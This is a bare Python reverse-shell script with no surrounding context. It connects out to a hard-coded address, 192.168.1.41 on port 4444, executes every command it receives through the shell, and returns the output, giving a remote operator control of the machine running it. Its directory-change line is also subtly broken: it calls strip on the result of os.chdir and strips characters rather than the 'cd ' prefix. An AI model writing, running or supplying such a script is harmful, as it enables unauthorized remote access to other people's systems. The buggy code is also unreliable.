import socket, subprocess, os

HOST = "192.168.1.41"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while True:
    s.send(f"{os.getcwd()}>".encode())
    cmd = s.recv(1024).decode()
    if cmd.startswith("cd "):
        os.chdir(cmd.strip("cd ")).strip()
        continue
    output = subprocess.run(cmd,shell=True,
                            capture_output=True)
    s.send(output.stdout + output.stderr)

